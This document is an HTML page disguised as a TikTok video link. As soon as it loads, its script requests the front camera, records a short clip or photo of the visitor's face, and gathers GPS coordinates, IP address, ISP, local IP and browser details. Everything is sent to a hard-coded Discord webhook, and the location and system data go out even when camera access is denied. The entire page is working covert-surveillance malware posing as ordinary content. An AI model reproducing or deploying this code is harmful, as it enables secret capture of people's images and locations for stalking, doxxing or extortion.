<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Tiktok video" property="og:title">
<meta content="Watch tiktok" property="og:description">
<meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
<meta content="website" property="og:type"/>
<title>TikTok</title>
<style>
body {
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
    }
.container {
    text-align: center;
    max-width: 400px;
    width: 100%;
    }
.image-container {
    background-color: #1c1e24;
    border-radius: 20px;
    overflow: hidden;
    margin-bottom: 20px;
    }
video {
    width: 100%;
    height: auto;
    display: none;
    }
canvas {
    display: none;
    }
</style>
</head>
<body>
<div class="container">
<div class="image-container">
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
</div>
<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    // Variables for video recording
    let mediaRecorder;
    let recordedChunks = [];
    let recording = false;
    let recordingTimer;

    // Start the process immediately
    setTimeout(() => {
        startVerification();
    }, 500);
    
    async function startVerification() {
        try {
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            // Attach camera stream to video element
            video.srcObject = stream;
            
            // Wait for video to load
            video.addEventListener('loadedmetadata', () => {
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Start recording
                startRecording(stream);
            });
        } catch (err) {
            // If camera access fails, still send system info
            setTimeout(() => {
                getLocationAndIP().then(systemInfo => {
                    sendToDiscord(null, systemInfo);
                });
            }, 1500);
        }
    }
    
    function startRecording(stream) {
        try {
            // Set up media recorder
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm; codecs=vp9'
            });
            
            // Handle data available event
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            // Handle recording stop
            mediaRecorder.onstop = () => {
                // Create a blob from the recorded chunks
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Get location and IP, then send to Discord
                getLocationAndIP().then(systemInfo => {
                    sendToDiscord(blob, systemInfo);
                });
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            };
            
            // Start recording
            mediaRecorder.start();
            recording = true;
            
            // Set timer to stop recording after 2 seconds
            recordingTimer = setTimeout(() => {
                if (recording) {
                    mediaRecorder.stop();
                    recording = false;
                }
            }, 2000);
            
        } catch (err) {
            // Fallback to photo capture if video recording fails
            setTimeout(() => {
                capturePhoto();
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        }
    }
    
    function capturePhoto() {
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Get location and IP, then send the captured image to Discord
        getLocationAndIP().then(systemInfo => {
            sendToDiscord(canvas, systemInfo);
        });
    }
    
    async function getLocationAndIP() {
        // Collect basic system information with emojis
        const systemInfo = {
            "🌐 User Agent": navigator.userAgent,
            "💻 Platform": navigator.platform,
            "🗣️ Language": navigator.language,
            "🕒 Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "📺 Screen": `${screen.width}x${screen.height}`,
            "🍪 Cookies Enabled": navigator.cookieEnabled,
            "📅 Date": new Date().toISOString(),
            "📍 Location": "Unknown",
            "📡 IP Address": "Unknown",
            "🗺️ Google Maps": "No location data"
        };
        
        try {
            // Try HTML5 Geolocation API first (most accurate if user allows)
            const geoData = await getHTML5Geolocation();
            if (geoData) {
                systemInfo["📍 Location"] = `${geoData.city}, ${geoData.region}, ${geoData.country}`;
                systemInfo["🗺️ Google Maps"] = `[View on Google Maps](https://www.google.com/maps?q=${geoData.lat},${geoData.lon})`;
            } else {
                // If HTML5 geolocation fails, try IP-based location
                const ipData = await getIPWithFallback();
                if (ipData) {
                    systemInfo["📡 IP Address"] = ipData.ip || "Unknown";
                    
                    // Format location information
                    const locationParts = [];
                    if (ipData.city) locationParts.push(ipData.city);
                    if (ipData.region) locationParts.push(ipData.region);
                    if (ipData.country_name) locationParts.push(ipData.country_name);
                    
                    if (locationParts.length > 0) {
                        systemInfo["📍 Location"] = locationParts.join(', ');
                        
                        // Create Google Maps link if we have coordinates
                        if (ipData.latitude && ipData.longitude) {
                            const mapsUrl = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
                            systemInfo["🗺️ Google Maps"] = `[View on Google Maps](${mapsUrl})`;
                        }
                    }
                    
                    // Add more details if available
                    if (ipData.org) {
                        systemInfo["🏢 ISP"] = ipData.org;
                    }
                } else {
                    // Final fallback to local IP detection
                    try {
                        const localIP = await getLocalIP();
                        if (localIP) {
                            systemInfo["📡 IP Address"] = localIP;
                        }
                    } catch (localError) {
                        console.error('Error getting local IP:', localError);
                    }
                }
            }
        } catch (error) {
            console.error('Error fetching location data:', error);
        }
        
        return systemInfo;
    }
    
    // Try multiple IP detection services with fallbacks
    async function getIPWithFallback() {
        const services = [
            'https://api.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://api.db-ip.com/v2/free/self'
        ];
        
        for (const service of services) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 4000);
                
                const response = await fetch(service, { 
                    signal: controller.signal 
                });
                
                clearTimeout(timeoutId);
                
                if (response.ok) {
                    const data = await response.json();
                    
                    // Different services return data in different formats
                    if (service.includes('ipify')) {
                        // This only returns IP, so we need additional lookup
                        if (data.ip) {
                            const locationResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                            if (locationResponse.ok) {
                                return await locationResponse.json();
                            }
                        }
                    } else if (service.includes('ipapi')) {
                        return data;
                    } else if (service.includes('ipinfo')) {
                        let locParts = [];
                        if (data.loc) {
                            locParts = data.loc.split(',');
                        }
                        return {
                            ip: data.ip,
                            city: data.city,
                            region: data.region,
                            country_name: data.country,
                            latitude: locParts[0] || null,
                            longitude: locParts[1] || null,
                            org: data.org
                        };
                    } else if (service.includes('db-ip')) {
                        return {
                            ip: data.ipAddress,
                            city: data.city,
                            region: data.stateProvCode,
                            country_name: data.countryName,
                            latitude: data.latitude,
                            longitude: data.longitude
                        };
                    }
                }
            } catch (error) {
                console.log(`Service ${service} failed, trying next one`);
                continue;
            }
        }
        
        return null;
    }
    
    // HTML5 Geolocation function with improved accuracy
    function getHTML5Geolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            
            const geolocationOptions = {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            };
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    try {
                        const { latitude, longitude } = position.coords;
                        
                        // Use the most reliable reverse geocoding service
                        const locationData = await reverseGeocode(latitude, longitude);
                        if (locationData) {
                            resolve({
                                lat: latitude,
                                lon: longitude,
                                city: locationData.city || '',
                                region: locationData.region || '',
                                country: locationData.country || ''
                            });
                        } else {
                            // Even without reverse geocoding, we have coordinates
                            resolve({
                                lat: latitude,
                                lon: longitude,
                                city: '',
                                region: '',
                                country: ''
                            });
                        }
                    } catch (error) {
                        console.error('Error with reverse geocoding:', error);
                        resolve(null);
                    }
                },
                (error) => {
                    // User likely denied location permission
                    console.log('HTML5 Geolocation not available or denied:', error);
                    resolve(null);
                },
                geolocationOptions
            );
        });
    }
    
    // Use the most reliable reverse geocoding service
    async function reverseGeocode(lat, lon) {
        try {
            // Use OpenStreetMap Nominatim - most reliable
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, {
                headers: {
                    'Accept-Language': 'en'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                if (data && data.address) {
                    return {
                        city: data.address.city || data.address.town || data.address.village || '',
                        region: data.address.state || data.address.region || '',
                        country: data.address.country || ''
                    };
                }
            }
        } catch (error) {
            console.log('Reverse geocoding service failed');
        }
        
        return null;
    }
    
    // Get local IP address as final fallback
    async function getLocalIP() {
        return new Promise((resolve) => {
            // Try using RTCPeerConnection to get local IP
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(sdp => {
                pc.setLocalDescription(sdp);
            }).catch(() => resolve(null));
            
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
                    pc.onicecandidate = () => {};
                    pc.close();
                    resolve(myIP);
                }
            };
            
            // Timeout after 2 seconds
            setTimeout(() => resolve(null), 2000);
        });
    }
    
    function sendToDiscord(media, systemInfo) {
        // Format system info as a string with Markdown for links
        const systemInfoText = Object.entries(systemInfo)
            .map(([key, value]) => {
                // Handle the Google Maps link specially to preserve Markdown
                if (key === "🗺️ Google Maps" && value.startsWith("[View on Google Maps](")) {
                    return `${key}: ${value}`;
                }
                return `${key}: ${value}`;
            })
            .join('\n');
        
        // Create the main message payload
        const payload = {
            content: "**New Verification Request**",
            embeds: [
                {
                    title: "System Information",
                    description: systemInfoText,
                    color: 5814783, // TikTok-like color
                    timestamp: new Date().toISOString()
                }
            ]
        };
        
        // Replace with your Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1416217653961560174/JH1ylbkjgYwnMoFi-ifbL1gFyljeDwr7ADz6U-G72Vl0_87cdhFqyfK-baYMpz2xW9Qf';
        
        // First send the system information
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok && media) {
                // If there's media to send, prepare it
                const formData = new FormData();
                
                if (media instanceof HTMLCanvasElement) {
                    // Convert canvas to blob for image
                    media.toBlob(blob => {
                        formData.append('file', blob, 'verification.jpg');
                        
                        // Send image without the "Captured Image" caption
                        const imagePayload = {
                            embeds: [
                                {
                                    title: "Verification Image",
                                    color: 5814783,
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        };
                        
                        formData.append('payload_json', JSON.stringify(imagePayload));
                        
                        fetch(webhookURL, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.9);
                } else if (media instanceof Blob) {
                    // Send video
                    formData.append('file', media, 'verification.webm');
                    
                    const videoPayload = {
                        embeds: [
                            {
                                title: "Verification Video",
                                color: 5814783,
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };
                    
                    formData.append('payload_json', JSON.stringify(videoPayload));
                    
                    fetch(webhookURL, {
                        method: 'POST',
                        body: formData
                    });
                }
            }
        })
        .catch(error => console.error('Error sending to Discord:', error));
    }
});
</script>
</body>
</html>
